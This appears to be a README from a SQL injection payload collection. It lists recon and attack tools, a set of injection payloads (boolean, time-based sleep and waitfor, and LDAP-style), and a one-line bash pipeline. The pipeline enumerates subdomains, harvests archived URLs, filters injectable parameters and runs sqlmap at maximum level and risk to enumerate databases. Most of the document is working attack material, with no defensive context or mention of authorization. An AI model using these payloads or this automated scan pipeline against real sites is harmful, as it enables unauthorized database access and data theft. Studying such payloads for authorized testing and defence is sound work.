<div align="center"><samp><h1>SQL injection (SQLI) - PAYLOAD</h1></samp></div>
<b> Overview : </b>
<p>
A SQL injection is a technique that attackers use to gain unauthorized access to a web application database by adding a string of malicious code to a database query. A SQL injection (SQLi) manipulates SQL code to provide access to protected resources, such as sensitive data, or execute malicious SQL statements.
</p>
<div align="center"><samp><h1>Required Tools</h1></samp></div>
<pre>
httpx
subfinder
waybackurls
Gf Pattern
Sqlmap
Anew
</pre>
<div align="center"><samp><h1>Payload List</h1></samp></div>

```
'
' OR 1=1
' OR '1'='1
' OR 'True'='True
'pg_sleep(5) --+-
" or sleep(5)="
' or sleep(5)='
1) or sleep(5)#
") or sleep(5)="
') or sleep(5)='
1)) or sleep(5)#
")) or sleep(5)="
')) or sleep(5)='
;waitfor delay '0:0:5'--
);waitfor delay '0:0:5'--
' OR 1=1--
' OR 1=0--
%27%20or%201=1
*(|(object=*))
)%20or%20('x'='x
%20or%201=1
1) or pg_sleep(__TIME__)--
/**/or/**/1/**/=1
' or username like '%
);waitfor delay '0:0:__TIME__'--
or isNULL(1/0) /*
x' or 1=1 or 'x'='y
```
<samp>
<b>Automatic Bash Script :</b>
</samp>

```
cat wilcard.txt | subfinder -silent | httpx -silent | waybackurls | tee -a potential.txt; gf sqli | anew sqlmap.txt; sqlmap -m sqlmap.txt --technique=BEUST --level=5 --risk=3 -v3 --random-agent --dbs
```
